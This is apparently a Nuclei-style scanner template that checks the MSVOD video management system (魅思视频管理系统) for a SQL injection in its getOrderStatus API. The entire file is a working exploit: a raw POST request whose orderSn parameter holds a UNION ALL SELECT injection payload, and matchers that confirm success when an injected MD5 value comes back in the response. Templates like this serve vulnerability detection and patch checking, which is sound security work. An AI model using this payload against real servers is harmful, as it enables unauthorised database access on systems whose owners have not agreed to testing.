id: poc-yaml-msvod-getorderstatus-sqli
info:
  name: 魅思视频管理系统 getOrderStatus SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  metadata:
    product: 魅思视频管理系统
variables:
  t1: "{{rand_int(1000,10000)}}"
  t2: "{{md5(t1)}}"
http:
  - raw:
      - |
        POST /api/getOrderStatus HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        orderSn=') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(IFNULL(CAST(md5({{t1}}) AS NCHAR),0x20)),NULL,NULL,NULL,NULL,NULL-- -
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: dsl
        dsl:
          - contains(json(body, 'data.orderStatus'), t2)
          - contains(json(body, 'data.orderStatus'), "0")
